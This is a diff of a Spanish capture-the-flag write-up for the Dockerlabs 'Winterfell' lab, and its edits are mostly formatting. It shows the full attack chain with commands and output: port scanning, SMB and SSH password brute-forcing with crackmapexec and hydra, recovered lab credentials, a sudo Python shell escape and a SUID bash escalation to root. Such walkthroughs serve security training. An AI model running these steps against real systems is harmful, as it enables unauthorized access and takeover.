@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Winterfell 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Winterfell ​​
+
+## 🖥️ Writeup - Winterfell
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `SMB` `Enum4linux` `Gobuster` `CrackMapExec` `Smbclient` `Hydra` `Base64` `Sudoers` `Writable File`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip winterfell.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh winterfell.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,139,445 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 13:15 CEST
 Nmap scan report for 172.17.0.2
@@ -106,6 +115,7 @@ enum4linux -a 172.17.0.2
 ```
 
 Info:
+
 ```
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 
@@ -113,9 +123,10 @@ S-1-22-1-1000 Unix User\jon (Local User)
 S-1-22-1-1001 Unix User\aria (Local User)
 S-1-22-1-1002 Unix User\daenerys (Local User)
 ```
+
 Encontramos 3 usuarios válidos en el sistema: `jon`, `aria` y `daenerys`.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos un fuzzing de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -124,6 +135,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -165,7 +177,7 @@ fuegoyhielo
 
 Esto podría ser una lista de posibles contraseñas para los usuarios mencionados anteriormente. Guardamos el contenido en un archivo `pass.txt`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 A continuación, llevamos a cabo un ataque de fuerza bruta sobre el puerto `445` (`SMB`), utilizando los usuarios enumerados y el archivo `pass.txt`.
 
@@ -174,6 +186,7 @@ crackmapexec smb 172.17.0.2 -u jon -p pass.txt
 ```
 
 Info:
+
 ```
 SMB         172.17.0.2      445    77D3C9827BF1     [*] Windows 6.1 Build 0 (name:77D3C9827BF1) (domain:77D3C9827BF1) (signing:False) (SMBv1:False)
 SMB         172.17.0.2      445    77D3C9827BF1     [+] 77D3C9827BF1\jon:seacercaelinvierno
@@ -188,6 +201,7 @@ crackmapexec smb 172.17.0.2 -u jon -p seacercaelinvierno --shares
 ```
 
 Info:
+
 ```
 SMB         172.17.0.2      445    77D3C9827BF1     [*] Windows 6.1 Build 0 (name:77D3C9827BF1) (domain:77D3C9827BF1) (signing:False) (SMBv1:False)
 SMB         172.17.0.2      445    77D3C9827BF1     [+] 77D3C9827BF1\jon:seacercaelinvierno 
@@ -207,6 +221,7 @@ smbclient \\\\172.17.0.2\\shared -U jon
 ```
 
 Info:
+
 ```
 Password for [WORKGROUP\jon]:
 Try "help" to get a list of possible commands.
@@ -238,18 +253,19 @@ echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d
 ```
 
 Info:
+
 ```
 hijodelanister
 ```
 
 Probamos si esta contraseña es válida para alguno de los tres usuarios a través del puerto `22` (`SSH`).
 
-
 ```bash
 hydra -L users.txt -p hijodelanister ssh://172.17.0.2 -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -264,15 +280,16 @@ Obtenemos credenciales válidas para el usuario `jon` : `hijodelanister`.
 
 Accedemos por `SSH`.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for jon on 77d3c9827bf1:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -290,7 +307,7 @@ import os
 os.system("/bin/bash")
 ```
 
-Lo guardamos y lo ejecutamos de la siguiente manera. 
+Lo guardamos y lo ejecutamos de la siguiente manera.
 
 ```bash
 sudo -u aria python3 /home/jon/.mensaje.py
@@ -300,11 +317,12 @@ Con esto pivotamos con éxito al usuario `aria`.
 
 Una vez como `aria`, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for aria on 77d3c9827bf1:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -322,6 +340,7 @@ sudo -u daenerys ls /home/daenerys
 ```
 
 Info:
+
 ```
 mensajeParaJon
 ```
@@ -333,28 +352,30 @@ sudo -u daenerys cat /home/daenerys/mensajeParaJon
 ```
 
 Info:
+
 ```
 Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
 Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.
 
 !drakaris!
-``` 
+```
 
 Probamos a autenticarnos como el usuario `daenerys` utilizando la contraseña `drakaris`.
 
 ```bash
 su daenerys
 ```
- 
+
 Introducimos la contraseña y pivotamos con éxito a dicho usuario.
 
 Una vez como `daenerys`, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for daenerys on 77d3c9827bf1:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -378,7 +399,9 @@ Con ello, asignamos permisos `SUID` al binario `/bin/bash`, lo que nos permite e
 ```bash
 /bin/bash -p
 ```
+
 Info:
+
 ```
 bash-5.2# whoami
 root
